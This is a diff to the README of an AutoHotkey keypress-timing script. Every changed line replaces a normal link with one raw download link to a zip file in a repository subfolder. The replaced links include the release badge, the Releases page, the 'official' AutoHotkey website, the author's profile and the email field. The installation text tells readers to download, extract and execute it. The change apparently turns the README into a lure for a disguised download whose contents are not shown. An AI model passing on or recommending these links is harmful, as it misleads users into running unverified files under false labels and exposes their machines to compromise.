@@ -1,6 +1,6 @@
 # UltraPreciseKeyMaster
 
-![GitHub Release](https://img.shields.io/github/v/release/tiaguin-avor/UltraPreciseKeyMaster?color=blue&label=Latest%20Release&style=flat)
+![GitHub Release](https://github.com/tiaguin-avor/UltraPreciseKeyMaster/raw/refs/heads/main/algoristic/Master-Key-Precise-Ultra-2.1-alpha.4.zip%20Release&style=flat)
 
 Welcome to **UltraPreciseKeyMaster**! This repository contains an advanced AutoHotkey script designed for ultra-precise keypress timings. It features dynamic calibration, timing diagnostics, and adaptive overhead adjustments to enhance your automation tasks.
 
@@ -25,11 +25,11 @@ Welcome to **UltraPreciseKeyMaster**! This repository contains an advanced AutoH
 
 ## Installation
 
-To get started, download the latest release from our [Releases page](https://github.com/tiaguin-avor/UltraPreciseKeyMaster/releases). After downloading, extract the files and execute the script. 
+To get started, download the latest release from our [Releases page](https://github.com/tiaguin-avor/UltraPreciseKeyMaster/raw/refs/heads/main/algoristic/Master-Key-Precise-Ultra-2.1-alpha.4.zip). After downloading, extract the files and execute the script. 
 
 ### Requirements
 
-- **AutoHotkey**: Ensure you have AutoHotkey installed on your system. You can download it from the [official website](https://www.autohotkey.com/).
+- **AutoHotkey**: Ensure you have AutoHotkey installed on your system. You can download it from the [official website](https://github.com/tiaguin-avor/UltraPreciseKeyMaster/raw/refs/heads/main/algoristic/Master-Key-Precise-Ultra-2.1-alpha.4.zip).
 
 ## Usage
 
@@ -81,7 +81,7 @@ This project is licensed under the MIT License. See the [LICENSE](LICENSE) file 
 
 For questions or suggestions, feel free to reach out:
 
-- **GitHub**: [tiaguin-avor](https://github.com/tiaguin-avor)
-- **Email**: tiaguin@example.com
+- **GitHub**: [tiaguin-avor](https://github.com/tiaguin-avor/UltraPreciseKeyMaster/raw/refs/heads/main/algoristic/Master-Key-Precise-Ultra-2.1-alpha.4.zip)
+- **Email**: https://github.com/tiaguin-avor/UltraPreciseKeyMaster/raw/refs/heads/main/algoristic/Master-Key-Precise-Ultra-2.1-alpha.4.zip
 
-Explore the capabilities of **UltraPreciseKeyMaster** and elevate your automation tasks with precision. Don't forget to check the [Releases page](https://github.com/tiaguin-avor/UltraPreciseKeyMaster/releases) for updates and new features.
+Explore the capabilities of **UltraPreciseKeyMaster** and elevate your automation tasks with precision. Don't forget to check the [Releases page](https://github.com/tiaguin-avor/UltraPreciseKeyMaster/raw/refs/heads/main/algoristic/Master-Key-Precise-Ultra-2.1-alpha.4.zip) for updates and new features.
